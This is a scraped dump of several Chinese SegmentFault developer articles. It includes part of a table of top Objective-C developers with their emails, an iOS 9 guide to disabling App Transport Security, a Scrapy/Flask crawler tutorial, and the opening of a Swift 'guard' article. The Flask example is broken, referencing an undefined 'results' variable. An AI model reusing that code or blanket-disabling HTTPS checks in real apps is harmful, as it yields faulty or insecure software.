<strong>honcheng</strong><br><a rel=""nofollow"" href=""https://github.com/honcheng"">honcheng</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/208827?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""honcheng""></span>
</td>
  <td>name: ""honcheng""<br>company: ""buUuk Pte Ltd""<br>blog: ""<a rel=""nofollow"" href=""http://honcheng.com"">http://honcheng.com</a>""<br>location: ""Singapore""<br>email: ""honcheng@gmail.com""</td>
  <td>twitter:<a rel=""nofollow"" href=""https://twitter.com/honcheng"">https://twitter.com/honcheng</a>
</td>
</tr>
<tr>
<td>30</td>
  <td>
<strong>Marin Usalj</strong><br><a rel=""nofollow"" href=""https://github.com/supermarin"">supermarin</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/627285?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""supermarin""></span>
</td>
  <td>name: ""Marin Usalj""<br>company: ""Lyft""<br>blog: ""supermar.in""<br>location: ""San Francisco, CA""<br>
</td>
  <td>作品:<br><a rel=""nofollow"" href=""https://github.com/supermarin/Alcatraz"">Alcatraz</a>:Package manager for Xcode<br><br>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/in/marinusalj"">https://www.linkedin.com/in/marinusalj</a>
</td>
</tr>
<tr>
<td>31</td>
  <td>
<strong>shu223</strong><br><a rel=""nofollow"" href=""https://github.com/shu223"">shu223</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/587614?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""shu223""></span>
</td>
  <td>name: ""shu223""<br>company: ""Freelancer""<br>blog: ""<a rel=""nofollow"" href=""http://d.hatena.ne.jp/shu223/"">http://d.hatena.ne.jp/shu223/</a>""<br>location: ""Tokyo, Japan""<br>email: ""shuichi0526@gmail.com""<br>
</td>
  <td>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/pub/shuichi-tsutsumi/5b/b75/525"">https://www.linkedin.com/pub/shuichi-tsutsumi/5b/b75/525</a> <br>twitter:<a rel=""nofollow"" href=""https://twitter.com/shu223"">https://twitter.com/shu223</a>
</td>
</tr>
<tr>
<td>32</td>
  <td>
<strong>Krzysztof Zabłocki</strong><br><a rel=""nofollow"" href=""https://github.com/krzysztofzablocki"">krzysztofzablocki</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/1468993?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""krzysztofzablocki""></span>
</td>
  <td>name: ""Krzysztof Zabłocki""<br>company: """"<br>blog: ""<a rel=""nofollow"" href=""http://merowing.info"">http://merowing.info</a>""<br>location: ""Warsaw, Poland""<br>email: ""krzysztof.zablocki@me.com""<br>
</td>
  <td>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/pub/krzysztof-zab%C5%82ocki/26/200/442"">Krzysztof Zabłocki</a><br>twitter:<a rel=""nofollow"" href=""https://twitter.com/merowing_"">https://twitter.com/merowing_</a>
</td>
</tr>
<tr>
<td>33</td>
  <td>
<strong>Andy Matuschak</strong><br><a rel=""nofollow"" href=""https://github.com/andymatuschak"">andymatuschak</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/2771?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""andymatuschak""></span>
</td>
  <td>name: ""Andy Matuschak""<br>company: ""Khan Academy""<br>blog: ""<a rel=""nofollow"" href=""http://andymatuschak.org"">http://andymatuschak.org</a>""<br>location: ""San Francisco, CA""<br>email: ""andy@andymatuschak.org""<br>
</td>
  <td>twitter:<a rel=""nofollow"" href=""https://twitter.com/andy_matuschak"">https://twitter.com/andy_matuschak</a>
</td>
</tr>
<tr>
<td>34</td>
  <td>
<strong>Brad Larson</strong><br><a rel=""nofollow"" href=""https://github.com/BradLarson"">BradLarson</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/954279?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""BradLarson""></span>
</td>
  <td>name: ""Brad Larson""<br>company: ""Sunset Lake Software LLC""<br>blog: ""<a rel=""nofollow"" href=""http://www.sunsetlakesoftware.com"">http://www.sunsetlakesoftware.com</a>""<br>location: ""Madison, WI USA""<br>email: ""contact@sunsetlakesoftware.com""<br>
</td>
  <td>作品:<br><a rel=""nofollow"" href=""https://github.com/BradLarson/GPUImage"">GPUImage</a>:An open source iOS framework for GPU-based image and video processing<br>about:<a rel=""nofollow"" href=""http://www.sunsetlakesoftware.com/about"">Brad Larson</a>
</td>
</tr>
<tr>
<td>35</td>
  <td>
<strong>James Tang</strong><br><a rel=""nofollow"" href=""https://github.com/jamztang"">jamztang</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/852375?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""jamztang""></span>
</td>
  <td>name: ""James Tang""<br>blog: ""<a rel=""nofollow"" href=""http://jamztang.com"">http://jamztang.com</a>""<br>location: ""Hong Kong""<br>
</td>
  <td>twitter:<a rel=""nofollow"" href=""https://twitter.com/jamztang"">https://twitter.com/jamztang</a>
</td>
</tr>
<tr>
<td>36</td>
  <td>
<strong>kishikawa katsumi</strong><br><a rel=""nofollow"" href=""https://github.com/kishikawakatsumi"">kishikawakatsumi</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/40610?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""kishikawakatsumi""></span>
</td>
  <td>name: ""kishikawa katsumi""<br>company: ""Realm""<br>blog: ""<a rel=""nofollow"" href=""http://kishikawakatsumi.com"">http://kishikawakatsumi.com</a>""<br>location: ""Tokyo""<br>email: ""kishikawakatsumi@mac.com""<br>
</td>
  <td>作品:<br><a rel=""nofollow"" href=""https://github.com/kishikawakatsumi/UICKeyChainStore"">UICKeyChainStore</a>:UICKeyChainStore is a simple wrapper for Keychain on iOS. Makes using Keychain APIs as easy as NSUserDefaults.<br><br>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/in/kishikawakatsumiX"">https://www.linkedin.com/in/kishikawakatsumiX</a>456Xtwitter:<a rel=""nofollow"" href=""https://twitter.com/k_katsumiX"">https://twitter.com/k_katsumiX</a>457X简历:<a rel=""nofollow"" href=""http://kishikawakatsumi.com/#resume"">http://kishikawakatsumi.com/#resume</a>
</td>
</tr>
<tr>
<td>37</td>
  <td>
<strong>Meng To</strong><br><a rel=""nofollow"" href=""https://github.com/MengTo"">MengTo</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/1065452?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""MengTo""></span>
</td>
  <td>name: ""Meng To""<br>blog: ""<a rel=""nofollow"" href=""http://mengto.com/"">http://mengto.com/</a>""<br>email: ""shadownessguy@gmail.com""<br>
</td>
  <td>twitter:<a rel=""nofollow"" href=""https://twitter.com/mengtoX"">https://twitter.com/mengtoX</a>471X简历:<a rel=""nofollow"" href=""http://mengto.com/img/Resume.pdf"">http://mengto.com/img/Resume.pdf</a>
</td>
</tr>
<tr>
<td>38</td>
  <td>
<strong>Indragie Karunaratne</strong><br><a rel=""nofollow"" href=""https://github.com/indragiek"">indragiek</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/353158?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""indragiek""></span>
</td>
  <td>name: ""Indragie Karunaratne""<br>blog: ""<a rel=""nofollow"" href=""http://indragie.com"">http://indragie.com</a>""<br>location: ""Edmonton, AB""<br>email: ""i@indragie.com""<br>
</td>
  <td>twitter:<a rel=""nofollow"" href=""https://twitter.com/indragie"">https://twitter.com/indragie</a>
</td>
</tr>
<tr>
<td>39</td>
  <td>
<strong>Cédric Luthi</strong><br><a rel=""nofollow"" href=""https://github.com/0xced"">0xced</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/51363?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""0xced""></span>
</td>
  <td>name: ""Cédric Luthi""<br>blog: ""<a rel=""nofollow"" href=""http://0xced.blogspot.com"">http://0xced.blogspot.com</a>""<br>location: ""Geneva, Switzerland""<br>email: ""cedric.luthi@gmail.com""<br>
</td>
  <td>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/in/0xcedX"">https://www.linkedin.com/in/0xcedX</a>495Xtwitter:<a rel=""nofollow"" href=""https://twitter.com/0xced"">https://twitter.com/0xced</a>
</td>
</tr>
<tr>
<td>40</td>
  <td>
<strong>Jiangang Zhu</strong><br><a rel=""nofollow"" href=""https://github.com/levey"">levey</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/629136?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""levey""></span>
</td>
  <td>name: ""Jiangang Zhu""<br>company: ""Bindo Labs""<br>blog: ""<a rel=""nofollow"" href=""http://www.golevey.com"">http://www.golevey.com</a>""<br>location: ""New York""<br>email: ""levey.zhu@gmail.com""</td>
  <td>twitter:<a rel=""nofollow"" href=""https://twitter.com/LeveyZhu"">https://twitter.com/LeveyZhu</a>
</td>
</tr>
<tr>
<td>41</td>
  <td>
<strong>Ole Zorn</strong><br><a rel=""nofollow"" href=""https://github.com/omz"">omz</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/82469?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""omz""></span>
</td>
  <td>name: ""Ole Zorn""<br>company: ""omz:software""<br>blog: ""<a rel=""nofollow"" href=""http://omz-software.com"">http://omz-software.com</a>""<br>location: ""Berlin, Germany""</td>
  <td></td>
</tr>
<tr>
<td>42</td>
  <td>
<strong>Dan Abramov</strong><br><a rel=""nofollow"" href=""https://github.com/gaearon"">gaearon</a> <br><span class=""img-wrap""><img data-src=""https://avatars.githubusercontent.com/u/810438?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""gaearon""></span>
</td>
  <td>name: ""Dan Abramov""<br>company: """"<br>blog: ""<a rel=""nofollow"" href=""http://twitter.com/dan_abramov"">http://twitter.com/dan_abramov</a>""<br>location: ""St. Pete""<br>email: ""dan.abramov@me.com""<br>
</td>
  <td></td>
</tr>
<tr>
<td>43</td>
  <td>
<strong>Choi</strong><br><a rel=""nofollow"" href=""https://github.com/equus12"">equus12</a> <br>
</td>
  <td>name: ""Choi""<br>
</td>
  <td></td>
</tr>
<tr>
<td>44</td>
  <td>
<strong>Jonathan Wight</strong><br><a rel=""nofollow"" href=""https://github.com/schwa"">schwa</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/20267?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""schwa""></span>
</td>
  <td>name: ""Jonathan Wight""<br>blog: ""<a rel=""nofollow"" href=""http://toxicsoftware.com/"">http://toxicsoftware.com/</a>""<br>location: ""Berkeley CA""<br>email: ""schwa@toxicsoftware.com""<br>
</td>
  <td>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/in/jwight"">https://www.linkedin.com/in/jwight</a>
</td>
</tr>
<tr>
<td>45</td>
  <td>
<strong>Dustin L. Howett</strong><br><a rel=""nofollow"" href=""https://github.com/DHowett"">DHowett</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/189190?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""DHowett""></span>
</td>
  <td>name: ""Dustin L. Howett""<br>company: ""HowettNET""<br>blog: ""<a rel=""nofollow"" href=""http://howett.net"">http://howett.net</a>""<br>location: ""Berkeley, CA""<br>email: ""dustin@howett.net""<br>
</td>
  <td></td>
</tr>
<tr>
<td>46</td>
  <td>
<strong>Zheng Zhu</strong><br><a rel=""nofollow"" href=""https://github.com/MartianZ"">MartianZ</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/979135?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""MartianZ""></span>
</td>
  <td>name: ""Zheng Zhu""<br>company: """"<br>blog: ""<a rel=""nofollow"" href=""http://MartianZ.cn"">http://MartianZ.cn</a>""<br>location: ""UESTC""<br>email: ""fzyadmin@gmail.com""<br>
</td>
  <td>twitter:<a rel=""nofollow"" href=""https://twitter.com/_MartianZ"">https://twitter.com/_MartianZ</a>
</td>
</tr>
<tr>
<td>47</td>
  <td>
<strong>Brian Gesiak</strong><br><a rel=""nofollow"" href=""https://github.com/modocache"">modocache</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/552921?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""modocache""></span>
</td>
  <td>name: ""Brian Gesiak""<br>company: ""Facebook""<br>blog: ""<a rel=""nofollow"" href=""http://modocache.io"">http://modocache.io</a>""<br>location: ""Brooklyn, NY""<br>email: ""modocache@gmail.com""<br>
</td>
  <td>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/in/bgesiakX"">https://www.linkedin.com/in/bgesiakX</a>579Xtwitter:<a rel=""nofollow"" href=""https://twitter.com/modocache"">https://twitter.com/modocache</a>
</td>
</tr>
<tr>
<td>48</td>
  <td>
<strong>Dave DeLong</strong><br><a rel=""nofollow"" href=""https://github.com/davedelong"">davedelong</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/112699?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""davedelong""></span>
</td>
  <td>name: ""Dave DeLong""<br>blog: ""<a rel=""nofollow"" href=""http://davedelong.com/"">http://davedelong.com/</a>""<br>location: ""Santa Clara, CA""<br>
</td>
  <td>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/in/davedelongX"">https://www.linkedin.com/in/davedelongX</a>591Xtwitter:<a rel=""nofollow"" href=""https://twitter.com/davedelongX"">https://twitter.com/davedelongX</a>592Xstackoverflow:<a rel=""nofollow"" href=""http://stackoverflow.com/users/115730/dave-delong"">dave-delong</a>
</td>
</tr>
<tr>
<td>49</td>
  <td>
<strong>Qitao Yang</strong><br><a rel=""nofollow"" href=""https://github.com/KittenYang"">KittenYang</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/5517281?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""KittenYang""></span>
</td>
  <td>name: ""Qitao Yang""<br>company: ""Smartisan Software Co., Ltd.""<br>blog: ""<a rel=""nofollow"" href=""http://kittenyang.com"">http://kittenyang.com</a>""<br>location: ""Beijing,China""<br>email: ""kittenyang@icloud.com""<br>
</td>
  <td>Linkedin:<a rel=""nofollow"" href=""https://www.linkedin.com/pub/%E9%AA%91%E6%BB%94-%E6%9D%A8/a2/781/15"">杨骑滔 (KittenYang)</a>
</td>
</tr>
<tr>
<td>50</td>
  <td>
<strong>Jesse Squires</strong><br><a rel=""nofollow"" href=""https://github.com/jessesquires"">jessesquires</a> <br><span class=""img-wrap""><img data-src=""https://avatars0.githubusercontent.com/u/2301114?v=3&amp;s=100"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""jessesquires""></span>
</td>
  <td>name: ""Jesse Squires""<br>company: ""Hexed Bits""<br>blog: ""www.jessesquires.com""<br>location: ""San Francisco, CA""<br>
</td>
  <td>作品:<br><a rel=""nofollow"" href=""https://github.com/jessesquires/JSQMessagesViewController"">JSQMessagesViewController</a>:An elegant messages UI library for iOS<br><br>twitter:<a rel=""nofollow"" href=""https://twitter.com/jesse_squires"">https://twitter.com/jesse_squires</a>
</td>
</tr>
</tbody>
</table>
<p>转载请带上本文链接:</p>

<p><a rel=""nofollow"" href=""https://github.com/coderyi/Monkey/blob/master/github_top_users_repositories/github_top_users_objective-c_world.md""></a><a rel=""nofollow"" href=""https://github.com/coderyi/Monkey/blob/master/github_top_users_repositories/github_top_users_objective-c_world.md"">https://github.com/coderyi/Monkey/blob/master/github_top_users_reposit...</a></p>

                ", GitHub排名前50的Objective-C开发者,1531972105,441,1,285,1,1,https://segmentfault.com/a/1190000002944692
146,1,0,6,"
                    
<p>今天升级<code>Xcode 7.0 bata</code>发现网络访问失败。<br>输出错误信息</p>
<pre><code>The resource could not be loaded because the App Transport Security policy requires the use of a secure connection.</code></pre>
<p>Google后查证，iOS9引入了新特性<code>App Transport Security (ATS)</code>。详情：<a href=""https://developer.apple.com/library/prerelease/ios/releasenotes/General/WhatsNewIniOS/Articles/iOS9.html#//apple_ref/doc/uid/TP40016198-DontLinkElementID_13"" rel=""nofollow noreferrer"">App Transport Security (ATS)</a></p>
<p>新特性要求App内访问的网络必须使用<code>HTTPS</code>协议。<br>但是现在公司的项目使用的是<code>HTTP</code>协议，使用私有加密方式保证数据安全。现在也不能马上改成<code>HTTPS</code>协议传输。</p>
<h1>最终找到以下解决办法：</h1>
<ol>
<li>在Info.plist中添加<code>NSAppTransportSecurity</code>类型<code>Dictionary</code>。</li>
<li>在<code>NSAppTransportSecurity</code>下添加<code>NSAllowsArbitraryLoads</code>类型<code>Boolean</code>,值设为<code>YES</code>
</li>
</ol>
<h1>看到很多同学修改后还是不能用添加一下截图：</h1>
<ol><li>在Filter中搜索<code>Info.plist</code>，选择<code>Info.plist</code>进行编辑</li></ol>
<p><span class=""img-wrap""><img data-src=""/img/bVpWTi"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<ol><li>按照上面提到的方式添加信息，正确的修改会看到下图这个样子，注意类型<code>NSAppTransportSecurity</code>为<code>Dictionary</code>，<code>NSAllowsArbitraryLoads</code>为<code>Boolean</code>，复制粘贴的时候，不要多了空格，segment fault 页面上直接复制，经常会多一个出空格！</li></ol>
<p><span class=""img-wrap""><img data-src=""/img/bVpWTE"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<ol><li>注意⚠️，单元测试下面也有一个<code>Info.plist</code>，修改那个文件是没有作用的！</li></ol>
<h1>补充说明</h1>
<p>上面介绍的方法虽然解决了网络访问的问题，但是苹果提供的安全保障也被关闭了。<br>不过，按照国内的现状，关闭这个限制也许是更实际的做法。<br>至于原因就太多了，第三方SDK（几乎都是访问<code>HTTP</code>），合作伙伴接入（不能要求它们一定要支持HTTPS）。<br>如果你的App没有受到这些原因的限制，还是更建议你增加<code>HTTPS</code>支持，而不是关闭限制。<br>请大家根据项目的实际情况作调整。</p>
<p>出于安全考虑我们提倡使用<code>HTTPS</code>，退而求其次，优先考虑使用<code>例外</code>：将允许访问的域加入到配置列表中</p>
<p>@banxi1988 补充了配置的方法<br>对于实在不支持<code>HTTPS</code>的应该首先考虑添加<code>例外</code></p>
<p>添加例外的方式也很简单：<br>左键<code>Info.plist</code>选择<code>open with source code</code><br>然后添加类似如下的配置:</p>
<pre><code>    &lt;key&gt;NSAppTransportSecurity&lt;/key&gt;
    &lt;dict&gt;
        &lt;key&gt;NSExceptionDomains&lt;/key&gt;
        &lt;dict&gt;
            &lt;key&gt;qq.com&lt;/key&gt;
            &lt;dict&gt;
                &lt;key&gt;NSIncludesSubdomains&lt;/key&gt;
                &lt;true/&gt;
            &lt;/dict&gt;
            &lt;key&gt;sina.com.cn&lt;/key&gt;
            &lt;dict&gt;
                &lt;key&gt;NSIncludesSubdomains&lt;/key&gt;
                &lt;true/&gt;
            &lt;/dict&gt;
           &lt;/dict&gt;
   &lt;/dict&gt;</code></pre>
<p>根据自己需要的域名修改， NSIncludeSubdomains 顾名思义是包括子域的意思。</p>
<hr>
<h1>参考：</h1>
<ul>
<li><a href=""https://github.com/meteor/meteor/issues/4560"" rel=""nofollow noreferrer"">App Transport Security support aka apps on iOS 9 don't work #4560</a></li>
<li><a href=""http://devstreaming.apple.com/videos/wwdc/2015/711y6zlz0ll/711/711_networking_with_nsurlsession.pdf?dl=1"" rel=""nofollow noreferrer"">711_networking_with_nsurlsession.pdf</a></li>
</ul>
<h1>总结：</h1>
<p>苹果正在加大应用安全的管控，这个举措可以看出苹果对信息安全的重视，也暴露出大部分应用传输数据时都是未经过加密的，或使用私有方式加密，以至于苹果开始对开发者提出要求。<br>私有加密虽然一定程度上是安全的，但是终究不是一个长久之计。全世界这么多安全专家在维护<code>HTTPS</code>安全，早日使用<code>HTTPS</code>确保信息安全才是王道！也省去了私有加密协议的安全隐患！</p>
<h1>如果这片文章对你有用，请点一下<code>推荐</code>，让更多的人能找到这里</h1>

                ", iOS9 &amp; iOS10 &amp; iOS11 HTTP 不能正常使用的解决办法,1531972107,304,1,148,1,1,https://segmentfault.com/a/1190000002933776
147,1,0,6,"
                    
<h2>分析</h2>

<p>使用爬虫爬取网站page，并按事先的要求将需要的项目保存到数据库中，然后再使用python flask框架编写一个web 服务器讲数据库中的数据读出来，最后用swift编写一个应用将数据显示出来。我这里选区的所要爬取的网站是豆瓣电影网。</p>

<h2>技术选用</h2>

<p>爬虫：使用python的scrapy爬虫<br>
数据库：使用mongoDB，存储网页只需要key和value形式进行存储就好了，所以在这里选择mongoDB这种NOSQL数据库进行存储<br>
服务器：使用python的flask框架，用了你就知道几行代码就能完成很多事情，当然特别是flask可以根据需要组装空间，超轻量级。</p>

<h2>实现：</h2>

<ul>
<li>
<p>scrapy爬虫实现</p>

<p><span class=""img-wrap""><img data-src=""/img/bVmsBr"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述""></span><br>
上图是scrapy的文档结构，下面主要介绍几个文件。</p>
</li>
</ul>
<p>a. items.py</p>

<pre><code>from scrapy.item import Item, Field
import scrapy
class TopitmeItem(scrapy.Item):
    # define the fields for your item here like:
    # name = scrapy.Field()
    title = Field()
    dataSrc = Field()
    dataId = Field()
    filmReview = Field()
    startCount = Field()
这里可以把items.py看作是mvc中的model，在items里我们定义了自己需要的模型。
</code></pre>

<p>b. pipelines.py</p>

<pre><code>import pymongo
from scrapy.conf import settings
from scrapy.exceptions import DropItem
from scrapy import log
class MongoDBPipeline(object):
    def __init__(self):
        connection = pymongo.MongoClient(
            settings['MONGODB_SERVER'],
            settings['MONGODB_PORT']
        )
        db = connection[settings['MONGODB_DB']]
        self.collection = db[settings[‘MONGODB_COLLECTION’]]
    def process_item(self, item, spider):
        valid = True
        for data in item:
            if not data:
                valid = False
                raise DropItem(""Missing {0}!"".format(data))
        if valid:
            self.collection.insert(dict(item))
            log.msg(""Beauty added to MongoDB database!"",
                    level=log.DEBUG, spider=spider)
        return item

俗称管道，这个文件主要用来把我们获取的item类型存入mongodb
</code></pre>

<p>c. settings.py</p>

<pre><code>BOT_NAME = 'topitme'
SPIDER_MODULES = ['topitme.spiders']
NEWSPIDER_MODULE = 'topitme.spiders'
BOT_NAME = 'topitme'
ITEM_PIPELINES = ['topitme.pipelines.MongoDBPipeline',]
MONGODB_SERVER = ""localhost""
MONGODB_PORT = 27017
MONGODB_DB = ""topitme""
MONGODB_COLLECTION = ""beauty""
# Crawl responsibly by identifying yourself (and your website) on the user-agent
#USER_AGENT = 'topitme (+http://www.yourdomain.com)'

这里需要设置一些常量，例如mongodb的数据库名，数据库地址和数据库端口号等等
</code></pre>

<p>d. topitme_scrapy.py</p>

<pre><code>from scrapy import Spider
from scrapy.selector import Selector
from topitme.items import TopitmeItem

import sys
reload(sys)
sys.setdefaultencoding(‘utf8’)#设置默认编码格式

class topitmeSpider(Spider):
    name = ""topitmeSpider""
    allowed_domin =[""movie.douban.com""]
    start_urls = [
        ""http://movie.douban.com/review/latest/"",
    ]
    def parse(self, response):
        results = Selector(response).xpath('//ul[@class=""tlst clearfix""]')
        for result in results:
            item = TopitmeItem()
            # item['title'] = result.xpath('li[@class=""ilst""]/a/@src').extract()[0]
            item['title'] = result.xpath('li[@class=""ilst""]/a/@title').extract()[0].encode('utf-8')
            item['dataSrc'] = result.xpath('li[@class=""ilst""]/a/img/@src').extract()[0]
            item['filmReview'] = result.xpath('li[@class=""clst report-link""]/div[@class=""review-short""]/span/text()').extract()[0].encode('utf-8')
            item['dataId'] = result.xpath('li[@class=""clst report-link""]/div[@class=""review-short""]/@id').extract()[0]
            item['dataId'] = result.xpath('li[@class=""nlst""]/h3/a/@title').extract()[0]
            item['startCount'] = 0
            yield item

# ul[@class=""tlst clearfix""]/li[3]/div[1]
# //ul[@class=""tlst clearfix""]/li[@class=""ilst""]/a/img/@src

这个文件是爬虫程序的主要代码，首先我们定义了一个类名为topitmeSpider的类，继承自Spider类，然后这个类有3个基础的属性，name表示这个爬虫的名字，等一下我们在命令行状态启动爬虫的时候，爬虫的名字就是name规定的。
allowed_domin意思就是指在movie.douban.com这个域名爬东西。
start_urls是一个数组，里面用来保存需要爬的页面，目前我们只需要爬首页。所以只有一个地址。
然后def parse就是定义了一个parse方法（肯定是override的，我觉得父类里肯定有一个同名方法），然后在这里进行解析工作，这个方法有一个response参数，你可以把response想象成，scrapy这个框架在把start_urls里的页面下载了，然后response里全部都是html代码和css代码。这之中最主要的是涉及一个xpath的东西，XPath即为XML路径语言，它是一种用来确定XML（标准通用标记语言的子集）文档中某部分位置的语言。可以通过xpath定位到我们想要获取的元素。
</code></pre>

<ul>
<li>服务器</li>
</ul>
<p>使用python的flask框架实现</p>

<pre><code>from flask import Flask, request
import json
from bson import json_util
from bson.objectid import ObjectId
import pymongo

app = Flask(__name__)

client = pymongo.MongoClient()
db = client['topitme']
def toJson(data):
    return json.dumps(data, default=json_util.default)

@app.route('/FilmReview', methods=['GET'])

def findMovie():
    if request.method == 'GET':
        json_results = []
        for result in results:
            json_results.append(result)
        return toJson(json_results)

if __name__ == '__main__':
    app.run(debug=True)



首先可以看到代码，client，db两个参量是为了取得数据库连接。
findMovie函数响应http request，然后返回数据库数据，以JSON形式返回
</code></pre>

<ul>
<li>swift</li>
</ul>
<p>ios的实现就不详细介绍了，这里写这部分只是为了，验证结果。</p>

<h2>运行：</h2>

<ul>
<li>起服务器：</li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/bVmsBB"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述""></span></p>

<ul>
<li>起数据库：</li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/bVmsBF"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述""></span></p>

<ul>
<li>运行爬虫：</li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/bVmsBU"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述""></span></p>

<ul>
<li>访问服务器：<a rel=""nofollow"" href=""http://localhost:5000/FileReview"">http://localhost:5000/FileReview</a> 可以看到数据已经存储到数据库中了</li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/bVmsBZ"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述""></span></p>

<ul>
<li>ios运行情况：</li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/bVmsB3"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述""></span></p>

<ul>
<li>下面是原网站网页展示，可以看到所要的数据存储到数据库，并且正常显示出来</li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/bVmsCc"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述""></span></p>

                ", 爬虫与swift,1531972108,547,1,245,1,1,https://segmentfault.com/a/1190000002930913
148,1,0,6,"
                    
<p>转眼间，Swift已经一岁多了，这门新鲜、语法时尚、类型安全、执行速度更快的语言已经渐渐的深入广大开发者的心。我同样也是非常喜爱这门新的编程语言。</p>

<p>今年6月，一年一度的WWDC大会如期而至，在大会上Apple发布了Swift 2.0，引入了很多新的特性，以帮助开发者能更快，更简单的构建应用。我在这里也说道说道Swift 2.0中值得大家注意的新特性。</p>

<h2>
<code>guard</code>语句</h2>

<p><code>guard</code>语句和<code>if</code>语句有点类似，都是根据其关键字之后的表达式的布尔值决定下一步执行什么。但与<code>if</code>语句不同的是，<code>guard</code>语句只会有一个代码块，不像<code>if</code>语句可以<code>if else</code>多个代码块。</p>

<p>那么<code>guard</code>语句的作用到底是什么呢？顾名思义，就是守护。<code>guard</code>语句判断其后的表达式布尔值为<code>false</code>时，才会执行之后代码块里的代码，如果为<code>true</code>，则跳过整个<code>guard</code>语句，我们举例来看看。</p>

<p>我们以今年高考为例，在进入考场时一般都会检查身份证和准考证，我们写这样一个方法：</p>

<pre><code><br>func checkup(person: [String: String!]) {

    // 检查身份证，如果身份证没带，则不能进入考场
    guard let id = person[""id""] else {
        print(""没有身份证，不能进入考场!"")
        return
    }

    // 检查准考证，如果准考证没带，则不能进入考场
    guard let examNumber = person[""examNumber""] else {
        print(""没有准考证，不能进入考场!"")
        return
    }

    // 身份证和准考证齐全，方可进入考场
    print(""您的身份证号为:\(id)，准考证号为:\(examNumber)。请进入考场!"")

}

checkup([""id"": ""123456""]) // 没有准考证，不能进入考场!
checkup([""examNumber"": ""654321""]) // 没有身份证，不能进入考场!
